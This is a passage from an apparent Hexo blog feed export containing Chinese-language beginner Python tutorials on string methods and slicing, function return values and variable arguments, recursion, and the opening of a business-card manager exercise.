class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;www.baidu.com&#x27;</span>.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;baidu&#x27;</span>, <span class="string">&#x27;com&#x27;</span>]</span><br></pre></td></tr></table></figure><p><strong>string.join(seq)</strong></p><p>常常用来连接元素为字符串的列表进行固定格式的输出， 示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">54</span>]: str_list = [<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">55</span>]: <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>.join(str_list))</span><br><span class="line">hello</span><br><span class="line">world</span><br></pre></td></tr></table></figure><h3 id="统计---2">0) 统计 - 2</h3><p><strong>len(string)</strong> 统计字符串的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">61</span>]: str_test = <span class="string">&quot;hellow&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">62</span>]: <span class="built_in">len</span>(str_test)</span><br><span class="line">Out[<span class="number">62</span>]: <span class="number">6</span></span><br></pre></td></tr></table></figure><p><strong>stirng.count(substr)</strong></p><p>Python count()方法用于统计字符串里某个字符或者字符串出现的次数。可选参数为在字符串搜索的开始与结束位置。如果要查找的字符或字符串在源字符串中没有，程序并不会报错，只会得到结果0。 <code>str.count(sub, start= 0,end=len(string))</code></p><p>sub -- 搜索的子字符串 返回值该方法返回子字符串在字符串中出现的次数。</p><p><strong>注： 当字符串较长时，counter 函数耗时，慎用</strong></p><p>举例：a 字符串中从 索引为 7 开始，a 的个数为 2 个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: a=<span class="string">&quot;nationl daya!&quot;</span></span><br><span class="line">In [<span class="number">6</span>]: a.count(<span class="string">&quot;a&quot;</span>,<span class="number">7</span>)</span><br><span class="line">Out[<span class="number">6</span>]: <span class="number">2</span></span><br><span class="line">In [<span class="number">34</span>]: sub_str=<span class="string">&quot;ay“</span></span><br><span class="line"><span class="string">In [35]: a=&quot;</span>nationl daya! ayhe ay<span class="string">&quot;</span></span><br><span class="line"><span class="string">In [36]: a.count(sub_str)</span></span><br><span class="line"><span class="string">Out[36]: 3</span></span><br><span class="line"><span class="string">In [37]: a.count(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">Out[37]: 5</span></span><br></pre></td></tr></table></figure><h2 id="字符串的切片">字符串的切片</h2><ul><li><strong>切片</strong> 方法适用于<strong>字符串</strong>、<strong>列表</strong>、<strong>元组</strong><ul><li><strong>切片</strong> 使用 <strong>索引值</strong>来限定范围，从一个大的 <strong>字符串</strong> 中 <strong>切出</strong>小的 <strong>字符串</strong></li><li><strong>列表</strong> 和 <strong>元组</strong> 都是<strong>有序</strong> 的集合，都能够 <strong>通过索引值</strong>获取到对应的数据</li><li><strong>字典</strong> 是一个 <strong>无序</strong> 的集合，是使用<strong>键值对</strong> 保存数据</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串[开始索引:结束索引:步长]</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><ol type="1"><li>指定的区间属于 <strong>左闭右开</strong> 型<code>[开始索引, 结束索引)</code> =&gt;<code>开始索引 &gt;= 范围 &lt; 结束索引</code><ul><li>从 <code>起始</code> 位开始，到 ** <code>结束</code> 位的前一位**结束（<strong>不包含结束位本身</strong>)</li></ul></li><li>不写开始索引。默认从头开始，<strong>开始索引数字可以省略，冒号不能省略</strong></li><li>不写结束索引，默认到末尾结束，<strong>结束索引数字可以省略，冒号不能省略</strong></li><li>步长默认为 <code>1</code>，如果连续切片，<strong>数字和冒号都可以省略</strong></li></ol><h3 id="索引的顺序和倒序">索引的顺序和倒序</h3><ul><li>在 Python 中不仅支持 <strong>顺序索引</strong>，同时还支持<strong>倒序索引</strong></li><li>所谓倒序索引就是 <strong>从右向左</strong> 计算索引<ul><li>最右边的索引值是 <strong>-1</strong>，依次递减</li></ul></li></ul><p><strong>演练需求</strong></p><ul><li><ol type="1"><li>截取从 2 ~ 5 位置 的字符串</li></ol></li><li><ol start="2" type="1"><li>截取从 2 ~ <code>末尾</code> 的字符串</li></ol></li><li><ol start="3" type="1"><li>截取从 <code>开始</code> ~ 5 位置 的字符串</li></ol></li><li><ol start="4" type="1"><li>截取完整的字符串</li></ol></li><li><ol start="5" type="1"><li>从开始位置，每隔一个字符截取字符串</li></ol></li><li><ol start="6" type="1"><li>从索引 1 开始，每隔一个取一个</li></ol></li><li><ol start="7" type="1"><li>截取从 2 ~ <code>末尾 - 1</code> 的字符串</li></ol></li><li><ol start="8" type="1"><li>截取字符串末尾两个字符</li></ol></li><li><ol start="9" type="1"><li>字符串的逆序（面试题）</li></ol></li></ul><p><strong>答案</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">num_str = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 截取从 2 ~ 5 位置 的字符串</span></span><br><span class="line"><span class="built_in">print</span>(num_str[<span class="number">2</span>:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 截取从 2 ~ `末尾` 的字符串</span></span><br><span class="line"><span class="built_in">print</span>(num_str[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 截取从 `开始` ~ 5 位置 的字符串</span></span><br><span class="line"><span class="built_in">print</span>(num_str[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 截取完整的字符串</span></span><br><span class="line"><span class="built_in">print</span>(num_str[:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 从开始位置，每隔一个字符截取字符串</span></span><br><span class="line"><span class="built_in">print</span>(num_str[::<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 从索引 1 开始，每隔一个取一个</span></span><br><span class="line"><span class="built_in">print</span>(num_str[<span class="number">1</span>::<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 倒序切片</span></span><br><span class="line"><span class="comment"># -1 表示倒数第一个字符</span></span><br><span class="line"><span class="built_in">print</span>(num_str[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 截取从 2 ~ `末尾 - 1` 的字符串</span></span><br><span class="line"><span class="built_in">print</span>(num_str[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. 截取字符串末尾两个字符</span></span><br><span class="line"><span class="built_in">print</span>(num_str[-<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. 字符串的逆序（面试题）</span></span><br><span class="line"><span class="built_in">print</span>(num_str[<span class="number">0</span>::-<span class="number">1</span>])   <span class="comment"># 从 0 开始，步长为 -1， 向左切片，只会把 0 切出来</span></span><br><span class="line"><span class="built_in">print</span>(num_str[-<span class="number">1</span>::-<span class="number">1</span>])  <span class="comment"># 从最后一个字符开始，步长为 -1， 这样就造成了逆序</span></span><br><span class="line"></span><br><span class="line">Final：</span><br><span class="line"><span class="built_in">print</span>(num_str[::-<span class="number">1</span>])<span class="comment"># 之前在取完整字符串的时候，开始和结束索引都不用指定，因此，字符串逆序的时候，开始和结束索引也可以省略。</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> collections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python function</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/6.arg_return/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/6.arg_return/</url>
      
        <content type="html"><![CDATA[<h1 id="返回值">返回值</h1><h2 id="返回多个结果">返回多个结果</h2><p>元组可以包含锁哥数据，因此可以使用元组让函数一次返回多个值。如果函数返回的类型是元组，小括号可以省略。即: 推荐使用<code>return a,b</code> 替换 <code>return (a,b)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">def</span>  <span class="title function_">test</span>():</span><br><span class="line">   ...:     a = <span class="number">1</span></span><br><span class="line">   ...:     b = <span class="number">2</span></span><br><span class="line">   ...:     <span class="keyword">return</span> a,b</span><br><span class="line">   ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: a_out, b_out = test()</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: a_out</span><br><span class="line">Out[<span class="number">5</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: b_out</span><br><span class="line">Out[<span class="number">6</span>]: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: result = test()</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: <span class="built_in">type</span>(result)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="built_in">tuple</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="交换两个数字-a-b">交换两个数字 a, b</h2><p>解法 1：使用临时变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">14</span>]: c = a</span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: a = b</span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: b = c</span><br></pre></td></tr></table></figure><p>解法二：不适用临时变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">18</span>]: a = a + b</span><br><span class="line"></span><br><span class="line">In [<span class="number">19</span>]: b = a - b</span><br><span class="line"></span><br><span class="line">In [<span class="number">20</span>]: a = a - b</span><br></pre></td></tr></table></figure><p>解法三：Python 专有 --推荐</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a, b = (b, a) 等号右边是一个元组，只是把小括号省略了。</span></span><br><span class="line">a, b = b, a</span><br></pre></td></tr></table></figure><h1 id="函数参数">函数参数</h1><p>无论传递的参数是标示可变对象，还是不可变对象，只要针对在函数内部使用赋值语句，会在函数内部修改局部变量的引用，不会影响到外部变量的引用。因为赋值就直接改变了变量与对象的绑定。</p><h2 id="section">+=</h2><p>对一般对象而言， <code>+=</code> 就是 <code>xx = xx + varible</code>, 而列表变量使用 <code>+=</code> , 即: <code>num_list += 1</code> ，不会做相加再赋值的操作，本质上是在调用列表的 extend 方法，因此，它没有像<code>num_list = num_list + [4,5]</code>赋值操作这样，修改变量与对象的绑定，所以，实际上它操作的是外部传进的参数绑定的对象(即:可以对传进的外部列表对象进行修改)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">30</span>]: num_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">In [<span class="number">31</span>]: <span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">num_list</span>):</span><br><span class="line">    ...:     num_list += [<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">32</span>]: test(num_list)</span><br><span class="line"></span><br><span class="line">In [<span class="number">33</span>]: num_list</span><br><span class="line">Out[<span class="number">33</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="comment"># 可以看到，使用 += 通过 extend 实际上操作的是和外部绑定的同一个列表对象</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">34</span>]: num_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">35</span>]: <span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">num_list</span>):</span><br><span class="line">    ...:     num_list = num_list + [<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">36</span>]: test(num_list)</span><br><span class="line"></span><br><span class="line">In [<span class="number">37</span>]: num_list</span><br><span class="line">Out[<span class="number">37</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="comment"># 可以看到，使用 = 赋值，重新将 num_list 变量绑定到了一个新的列表(num_list + [4,5]) 上，对外部变量的绑定对象没有影响。</span></span><br></pre></td></tr></table></figure><h2 id="缺省参数">缺省参数</h2><ul><li>定义函数时，可以给某个参数指定一个默认值，具有默认值的参数就叫做缺省参数</li><li>调用函数时，如果没有传入缺省参数的值，则在函数内部使用定义函数时指定的参数默认值</li><li>函数的缺省参数，将常见的值设置为参数的缺省值，从而简化函数的调用</li><li>例如：对列表排序的方法： <code>list.sort()</code> 有一个 reverse参数默认为 false，升序排序。</li></ul><h3 id="指定函数的缺省参数">指定函数的缺省参数</h3><ul><li>在参数后使用赋值语句，可以指定参数的缺省值</li></ul><p>提示</p><pre><code>1. 缺省参数，需要使用最常见的值作为默认值！2. 如果一个参数的值不能确定，则不应该设置默认值，具体的数值在调用函数时，由外界传递！</code></pre><p>缺省参数的注意事项</p><ol type="1"><li><p>缺省参数的定义位置</p><ul><li>必须保证带有默认值的缺省参数在参数列表末尾</li><li>所以，以下定义是错误的！</li></ul><p><code>def print_info(name, gender=True, title):</code></p></li><li><p>调用带有多个缺省参数的函数</p></li></ol><ul><li>在调用函数时，<strong>如果有多个缺省参数，需要指定参数名</strong>，这样解释器才能够知道参数的对应关系！</li></ul><h2 id="多值参数可变参数">多值参数(可变参数)</h2><h3 id="定义支持多值参数的函数">定义支持多值参数的函数</h3><ul><li><p>有时可能需要一个函数能够处理的参数个数是不确定的，这个时候，就可以使用多值参数</p></li><li><p>python 中有两种多值参数：</p><p>参数名前增加一个 <code>*</code> 可以接收元组 参数名前增加两个<code>*</code> 可以接收字典</p></li><li><p>一般在给多值参数命名时，习惯使用以下两个名字</p><ul><li><code>*args</code> --存放元组参数，前面有一个 <code>*</code></li><li><code>**kwargs</code> --存放字典参数，前面有两个 <code>*</code></li></ul></li><li><p><code>args</code> 是 <code>arguments</code>的缩写，有变量的含义</p></li><li><p><code>kw</code> 是 <code>keyword</code> 的缩写，<code>kwargs</code> 可以记忆键值对参数</p></li></ul><p>提示：多值参数的应用会经常出现在网络上一些大牛开发的框架中，知道多值参数，有利于我们能够读懂大牛的代码</p><p>代码示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">39</span>]: <span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">num, *nums, **person</span>):</span><br><span class="line">    ...:     <span class="built_in">print</span>(num)</span><br><span class="line">    ...:     <span class="built_in">print</span>(nums)</span><br><span class="line">    ...:     <span class="built_in">print</span>(person)</span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: demo(<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line">()</span><br><span class="line">&#123;&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]: demo(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">&#123;&#125;</span><br><span class="line">In [<span class="number">42</span>]: demo(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,name=<span class="string">&quot;小明&quot;</span>, age=<span class="number">14</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">14</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="案例-计算任意多个数字的和">案例: 计算任意多个数字的和</h3><p>需求:</p><ol type="1"><li>定义一个函数 <code>sum_numbers</code> , 可以接收的任意多个整数</li><li>功能要求: 将传递的所有数字累加，并且返回累加结果。</li></ol><p>如果不使用可变参数，即: 使用元组达到传递多值的效果，代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sum_numbers</span>(<span class="params">args</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 循环遍历</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> args:</span><br><span class="line">        num += n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">result = sum_numbers((<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))<span class="comment"># 这里要多写括号，使其成为元组。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>如果使用可变参数，代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sum_numbers</span>(<span class="params">*args</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 循环遍历</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> args:</span><br><span class="line">        num += n</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">result = sum_numbers(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>这样，传参的时候就方便简洁多了。</p><h3 id="传参中的拆包">传参中的拆包</h3><ul><li>在调用带有多值参数的函数时，如果希望：<ul><li>将一个元组变量，直接传递给 <code>args</code></li><li>将一个字典变量，直接传递给 <code>kwdrgs</code></li></ul></li><li>就可以使用拆包，简化参数的传递，拆包的方式是：<ul><li>在元组变量前，增加一个 <code>*</code></li><li>在字典变量前，增加两个 <code>*</code></li></ul></li><li>在格式化输出的时候，也可以直接拆包比如：<code>print("%d %d" % hero_rect.size)</code> 直接将含有两个 number的元组进行拆包输出。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line"></span><br><span class="line"><span class="comment">#需要将一个元组变量/字典变量传递给函数对应的参数</span></span><br><span class="line"></span><br><span class="line">gl_nums = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">gl_dict = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">18</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 会把 gl_nums 和 gl_dict 作为元祖传递给 args</span></span><br><span class="line"><span class="comment"># demo(gl_nums, gl_dict)</span></span><br><span class="line"><span class="comment"># OUTPUT:</span></span><br><span class="line"><span class="comment"># ((1, 2, 3), &#123;&#x27;name&#x27;: &#x27;xiaoming&#x27;, &#x27;age&#x27;: 18&#125;)</span></span><br><span class="line"><span class="comment"># &#123;&#125;</span></span><br><span class="line"></span><br><span class="line">demo(*gl_nums, **gl_dict)</span><br></pre></td></tr></table></figure><p>输出:</p><blockquote><p>(1, 2, 3)</p></blockquote><p>{'name': 'xiaoming', 'age': 18}</p><h1 id="递归">递归</h1><p>Be aware that recursion really isn’t a strong Python feature duetothe inherent recursion limit</p><p>特点：</p><ul><li>一个函数内部调用自己<ul><li>一个函数内部可以调用其他函数，当然，在函数内部也可以调用自己</li></ul></li></ul><p>代码特点：</p><ol type="1"><li>函数内部代码是相同的，只是针对参数不同，处理结果不同</li><li>当参数满足一个条件时，函数不再执行<ul><li>这个非常重要，通常被称为<strong>递归的出口</strong>，否则会出现死循环</li></ul></li><li>编写递归程序时，关键两点:<ol type="1"><li>递归出口，递归截止条件</li><li>递推表达式</li></ol></li></ol><p>提示：递归是一个编程技巧，在处理不确定的循环条件时，格外有用，例如:遍历整个文件目录结构</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python card manager</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/9.cards_manager/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/9.cards_manager/</url>
      
        <content type="html"><![CDATA[<h1 id="综合应用-名片管理系统">综合应用 —— 名片管理系统</h1><h2 id="目标">目标</h2><p>综合应用已经学习过的知识点：</p><ul><li><strong>变量</strong></li><li><strong>流程控制</strong></li><li><strong>函数</strong></li><li><strong>模块</strong></li></ul><p>开发 <strong>名片管理系统</strong></p><h2 id="系统需求">系统需求</h2><ul><li><ol type="1"><li>程序启动，显示名片管理系统欢迎界面，并显示功能菜单</li></ol></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">**************************************************</span><br><span class="line">欢迎使用【名片管理系统】V1.0</span><br><span class="line"></span><br><span class="line">1. 新建名片</span><br><span class="line">2. 显示全部</span><br><span class="line">3. 查询名片</span><br><span class="line"></span><br><span class="line">0. 退出系统</span><br><span class="line">**************************************************</span><br></pre></td></tr></table></figure><ul><li><ol start="2" type="1"><li>用户用数字选择不同的功能</li></ol></li><li><ol start="3" type="1"><li>根据功能选择，执行不同的功能</li></ol></li><li><ol start="4" type="1"><li>用户名片需要记录用户的<strong>姓名</strong>、<strong>电话</strong>、<strong>QQ</strong>、<strong>邮件</strong></li></ol></li><li><ol start="5" type="1"><li>如果查询到指定的名片，用户可以选择 <strong>修改</strong> 或者<strong>删除</strong> 名片</li></ol></li></ul><h2 id="步骤">步骤</h2><p>自顶而下，大功能框架编写测试好，再对逐个功能进行:编写 -&gt;测试。</p><ol type="1"><li>框架搭建写项目时，往往先搭建框架：大概功能的注释，对每个功能的简单提示。然后再逐个功能进行:编写-&gt; 测试 -&gt; 完成。 注:如果在开发程序时,不希望立刻编写分支内部的代码, 可以使用 pass</li><li>新增名片</li><li>显示所有名片</li><li>查询名片</li><li>查询成功后修改、删除名片</li><li>让 Python 程序能够直接运行</li></ol><h2 id="框架搭建">01. 框架搭建</h2><p><strong>目标</strong></p><ul><li>搭建名片管理系统 <strong>框架结构</strong><ol type="1"><li><strong>准备文件</strong>，确定文件名，保证能够<strong>在需要的位置</strong> 编写代码</li><li>编写 <strong>主运行循环</strong>，实现基本的<strong>用户输入和判断</strong></li></ol></li></ul><h3 id="文件准备">1.1 文件准备</h3><ol type="1"><li>新建 <code>cards_main.py</code> 保存 <strong>主程序功能代码</strong><ul><li><strong>程序的入口</strong></li><li>每一次启动名片管理系统都通过 <code>main</code> 这个文件启动</li></ul></li><li>新建 <code>cards_tools.py</code> 保存<strong>所有名片功能函数</strong><ul><li>将对名片的<strong>新增</strong>、<strong>查询</strong>、<strong>修改</strong>、<strong>删除</strong>等功能封装在不同的函数中</li></ul></li></ol><h3 id="编写主运行循环">1.2 编写主运行循环</h3><ul><li>在 <code>cards_main</code> 中添加一个 <strong>无限循环</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># TODO(小明) 显示系统菜单</span></span><br><span class="line"></span><br><span class="line">    action = <span class="built_in">input</span>(<span class="string">&quot;请选择操作功能：&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;您选择的操作是：%s&quot;</span> % action)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据用户输入决定后续的操作</span></span><br><span class="line">    <span class="keyword">if</span> action <span class="keyword">in</span> [<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>]:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> action == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;欢迎再次使用【名片管理系统】&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入错误，请重新输入&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="字符串判断">字符串判断</h4><ol type="1"><li>使用 <code>in</code> 针对 <strong>列表</strong> 判断，避免使用<code>or</code> 拼接复杂的逻辑条件</li><li>没有使用 <code>int</code> 转换用户输入，可以避免<strong>一旦用户输入的不是数字</strong>，导致程序运行出错</li></ol><h4 id="pass">pass</h4><ul><li><code>pass</code>就是一个空语句，不做任何事情，一般用做占位语句</li><li>是为了保持程序结构的完整性</li></ul><h4 